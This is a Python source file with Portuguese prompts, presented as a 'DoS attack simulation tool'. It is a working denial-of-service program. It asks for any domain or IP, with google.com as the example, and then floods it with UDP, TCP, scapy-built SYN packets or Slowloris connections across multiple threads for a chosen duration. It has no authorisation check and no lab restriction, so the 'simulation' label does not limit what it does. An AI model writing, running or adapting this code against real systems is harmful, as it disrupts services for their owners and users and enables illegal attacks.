import socket
import threading
import time
import logging
import warnings
from scapy.all import IP, TCP, send
from scapy.config import conf
from cryptography.utils import CryptographyDeprecationWarning

# Configuração de logs
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

# Suprimir avisos do Cryptography
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

def validate_ip_or_domain(target):
    try:
        socket.gethostbyname(target)
        return True
    except socket.error:
        return False

# Ataques
def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"A" * 1024
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))

def tcp_flood(target_ip, target_port, duration):
    packet = b"A" * 1024
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(packet)
            sock.close()
        except:
            continue

def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")
        send(ip/tcp, verbose=False)

def slowloris(target_ip, target_port, duration):
    sockets = []
    logging.info("Iniciando Slowloris...")
    try:
        for _ in range(100):  # limite inicial de conexões
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(f"Host: {target_ip}\r\n".encode())
            sockets.append(s)
    except socket.error:
        pass

    end_time = time.time() + duration
    while time.time() < end_time:
        logging.info(f"Conexões ativas: {len(sockets)}")
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
                time.sleep(1)
            except socket.error:
                sockets.remove(s)

def run_attack(method_func, ip, port, duration, threads):
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=method_func, args=(ip, port, duration))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

def main():
    print("=== Ferramenta de Simulação de Ataques DoS ===")
    target = input("Digite o domínio ou IP do alvo (ex: google.com): ").strip()

    if not validate_ip_or_domain(target):
        logging.error("Endereço IP ou domínio inválido.")
        return

    target_ip = socket.gethostbyname(target)

    print("\nEscolha o método de ataque:")
    print("1 - UDP Flood")
    print("2 - TCP Flood")
    print("3 - SYN Flood")
    print("4 - Slowloris")

    method_choice = input("Digite o número do método [1-4]: ").strip()
    method_map = {
        "1": ("udp", udp_flood),
        "2": ("tcp", tcp_flood),
        "3": ("syn", syn_flood),
        "4": ("slowloris", slowloris),
    }

    if method_choice not in method_map:
        logging.error("Método inválido.")
        return

    method_name, method_func = method_map[method_choice]

    try:
        port = int(input("Digite a porta do alvo (padrão 80): ") or 80)
        duration = int(input("Digite a duração do ataque em segundos (padrão 60): ") or 60)
        threads = int(input("Digite o número de threads (padrão 4): ") or 4)
    except ValueError:
        logging.error("Entrada inválida. Certifique-se de digitar números para porta, duração e threads.")
        return

    if port < 1 or port > 65535:
        logging.error("Porta inválida.")
        return

    logging.info(f"Iniciando ataque {method_name.upper()} em {target_ip}:{port} com {threads} threads por {duration} segundos.")
    run_attack(method_func, target_ip, port, duration, threads)
    logging.info("Ataque finalizado.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.warning("Interrompido pelo usuário.")